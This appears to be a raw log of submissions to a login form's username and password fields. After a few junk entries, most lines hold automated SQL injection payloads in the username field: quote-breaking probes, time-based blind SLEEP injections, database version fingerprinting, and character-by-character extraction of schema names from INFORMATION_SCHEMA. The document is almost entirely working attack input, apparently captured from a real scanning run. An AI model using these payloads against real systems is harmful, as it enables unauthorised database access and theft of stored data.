User Name:rdsdPassword:dsa456
User Name:iujiPassword:jjhik
User Name:ui huiPassword:lkpkol
User Name:123Password:0212
User Name:123Password:0212
User Name:123.((.(.'(("Password:0212
User Name:123'MyexeQ<'">txYVAjPassword:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123) AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND (2060=2060Password:0212
User Name:123 AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs)Password:0212
User Name:123 AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs)-- EDtcPassword:0212
User Name:123') AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND ('HZRc'='HZRcPassword:0212
User Name:123' AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND 'aWtT'='aWtTPassword:0212
User Name:123' AND (SELECT 2973 FROM (SELECT(SLEEP(0)))lmjs) AND 'aWtT'='aWtTPassword:0212
User Name:123' AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND 'aWtT'='aWtTPassword:0212
User Name:123' AND (SELECT 5874 FROM (SELECT(SLEEP(5-(IF(23=23,0,5)))))ksGo) AND 'SqSF'='SqSFPassword:0212
User Name:123' AND (SELECT 3543 FROM (SELECT(SLEEP(5-(IF(23=48,0,5)))))Eakq) AND 'TDMX'='TDMXPassword:0212
User Name:123' AND (SELECT 5321 FROM (SELECT(SLEEP(5-(IF(23=62,0,5)))))feAz) AND 'aRvj'='aRvjPassword:0212
User Name:123' AND (SELECT 4945 FROM (SELECT(SLEEP(5-(IF(62=48,0,5)))))aYQC) AND 'uJYT'='uJYTPassword:0212
User Name:123' AND (SELECT 3709 FROM (SELECT(SLEEP(5-(IF(48=48,0,5)))))pbUB) AND 'THnm'='THnmPassword:0212
User Name:123' AND (SELECT 4336 FROM (SELECT(SLEEP(5-(IF(62 48,0,5)))))UWWf) AND 'ezLZ'='ezLZPassword:0212
User Name:123' AND (SELECT 1011 FROM (SELECT(SLEEP(5-(IF(7317>7316,0,5)))))Hetg) AND 'ClUr'='ClUrPassword:0212
User Name:123' AND (SELECT 3912 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))GCJq) AND 'GCdv'='GCdvPassword:0212
User Name:123' AND (SELECT 6567 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x255469444225,0,5)))))BlnH) AND 'pujT'='pujTPassword:0212
User Name:123' AND (SELECT 8466 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x256472697a7a6c6525,0,5)))))ZYCs) AND 'KzOJ'='KzOJPassword:0212
User Name:123' AND (SELECT 9770 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x25506572636f6e6125,0,5)))))OpTC) AND 'BhRt'='BhRtPassword:0212
User Name:123' AND (SELECT 2441 FROM (SELECT(SLEEP(5-(IF(AURORA_VERSION() LIKE 0x25,0,5)))))sADM) AND 'LfVS'='LfVSPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>51,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>54,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>52,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>53,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))!=54,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>51,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>48,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>9,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),2,1))>108,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),2,1))>110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),2,1))>109,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),2,1))!=110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>100,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>102,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))>101,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),3,1))!=102,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))>108,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))>110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))>111,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),4,1))!=111,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>120,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>116,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>114,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))>113,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),5,1))!=114,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))>108,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))>110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))>109,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),6,1))!=109,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))>100,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))>98,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))>97,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),7,1))!=97,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))>120,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))>116,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))>114,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))>115,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),8,1))!=116,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))>108,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))>106,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))>105,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),9,1))!=105,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))>108,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))>110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))>111,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),10,1))!=111,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))>112,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))>104,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))>108,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))>110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))>109,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),11,1))!=110,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),12,1))>96,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),12,1))>48,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
User Name:123' AND (SELECT 8899 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),12,1))>72,0,1)))))LAdY) AND 'XwTa'='XwTaPassword:0212
